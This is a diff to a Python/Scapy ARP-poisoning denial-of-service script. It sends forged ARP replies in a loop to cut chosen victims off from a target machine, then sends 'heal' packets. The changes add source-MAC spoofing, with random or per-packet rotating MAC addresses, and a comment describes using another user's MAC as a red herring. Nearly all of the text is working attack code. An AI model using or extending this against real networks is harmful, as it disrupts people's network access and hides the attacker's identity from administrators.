@@ -6,18 +6,17 @@ from scapy.all import *
 from time import sleep
 from sys import exit
 import netifaces
+from subnet import MACgen
 
 '''
 	Creates either an attack or recovery packet
 '''
 
-def createPacket(victimIP, victimMAC, deadEndIP, deadEndMAC, poison):
+def createPacket(victimIP, victimMAC, deadEndIP, deadEndMAC, srcMAC, poison):
 	
-	
-	myMAC = "08:00:27:f7:e8:72"		#MAC address of origin of poisioning 
 									#set as another users MAC for Red herring attempt
 	if poison == True:
-		dstMAC = "08:00:27:ff:ff:fe"		#False MAC address
+		dstMAC = "ff:ff:ff:ff:ff:fe"		#False MAC address
 	else:
 		dstMAC = deadEndMAC
 
@@ -26,7 +25,7 @@ def createPacket(victimIP, victimMAC, deadEndIP, deadEndMAC, poison):
 	#Ethernet*****************
 	pkt = Ether()/ARP()	
 	pkt.dst = victimMAC		#Ethernet Destination
-	pkt.src = myMAC			#Ethernet Source
+	pkt.src = srcMAC		#Ethernet Source
 	#************************
 	
 	#ARP**********************
@@ -44,23 +43,30 @@ def createPacket(victimIP, victimMAC, deadEndIP, deadEndMAC, poison):
 	quarantine: the machine they will be cut off from
 	verbosity: Controls output
 '''
-def DenialOfService(interface, victims, quarantine, verbosity):
+def DenialOfService(interface, victims, quarantine, srcMAC, verbosity):
 
 	qIP = quarantine[0]
 	qMAC = quarantine[1]
 
 	packets = []
 
+	MAC = ""
+
 	#Create a personalized attack packet for each host
 	for ip, info in victims.iteritems():
-		packets.append( createPacket(ip,info[0], qIP, qMAC, True) )
-
+		if srcMAC == 0:
+			MAC = MACgen()
+			packets.append( createPacket(ip,info[0], qIP, qMAC, MAC, True) )
+		else:
+			packets.append( createPacket(ip,info[0], qIP, qMAC, srcMAC, True))
 
 	print("Turn out the lights....")
 
 	try:
 		while True:
 			for pkt in packets:
+				if srcMAC == 1:
+					pkt[Ether].src = MACgen()
 				sendp(pkt, iface=interface, verbose=0)
 				
 			sleep(2)
@@ -72,10 +78,14 @@ def DenialOfService(interface, victims, quarantine, verbosity):
 
 		#Create personalized recovery packets
 		for ip, info in victims.iteritems():
-			healPacks.append(createPacket(ip,info[0], qIP, qMAC, False))
-
+			if srcMAC == 0:
+				healPacks.append(createPacket(ip,info[0], qIP, qMAC, MAC, False))
+			else:
+				healPacks.append(createPacket(ip,info[0], qIP, qMAC, srcMAC, False))
 		for i in range(0, 5):
 			for heal in healPacks:
+				if srcMAC == 1:
+					heal[Ether].src = MACgen()
 				sendp(heal, iface=interface, verbose=0)
 				
 			sleep(1)
